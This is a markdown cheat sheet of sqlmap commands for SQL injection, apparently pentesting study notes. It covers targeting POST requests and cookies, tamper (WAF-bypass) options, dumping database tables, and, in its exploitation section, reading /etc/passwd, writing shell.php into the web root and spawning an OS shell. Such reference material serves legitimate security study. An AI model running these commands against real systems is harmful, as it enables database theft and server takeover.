#web #sqli #sqlmap #tool

# SQLMap Essentials

Related: [sqli](sqli.md) · [sqli-advanced](sqli-advanced.md) · [blind-sqli](blind-sqli.md)

## Targeting
```bash
sqlmap -u "http://www.example.com/vuln.php?id=1" --batch
```
Run without prompting for input.

```bash
sqlmap 'http://www.example.com/' --data 'uid=1&name=test'
```
Inject into a POST request.

```bash
sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'
```
Mark a specific injection point with `*`.

```bash
sqlmap -r req.txt
```
Use a saved raw HTTP request.

```bash
sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
```
Set a cookie header.

```bash
sqlmap -u www.target.com --data='id=1' --method PUT
```
Specify an HTTP method.

## Tuning
```bash
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
```
Set an injection prefix/suffix.

```bash
sqlmap -u www.example.com/?id=1 -v 3 --level=5 --risk=3
```
Raise detection level and risk.

```bash
sqlmap --list-tampers
```
List tamper (WAF-bypass) scripts.

```bash
sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
```
Handle an anti-CSRF token.

## Enumeration
```bash
sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
```
Basic DB enumeration.

```bash
sqlmap -u "http://www.example.com/?id=1" --tables -D testdb
```
Enumerate tables in a database.

```bash
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname
```
Dump specific columns.

```bash
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"
```
Conditional dump.

```bash
sqlmap -u "http://www.example.com/?id=1" --schema
```
Enumerate the full schema.

## Exploitation
```bash
sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"
```
Read a local file.

```bash
sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
```
Write a file to the server.

```bash
sqlmap -u "http://www.example.com/?id=1" --os-shell
```
Spawn an interactive OS shell.
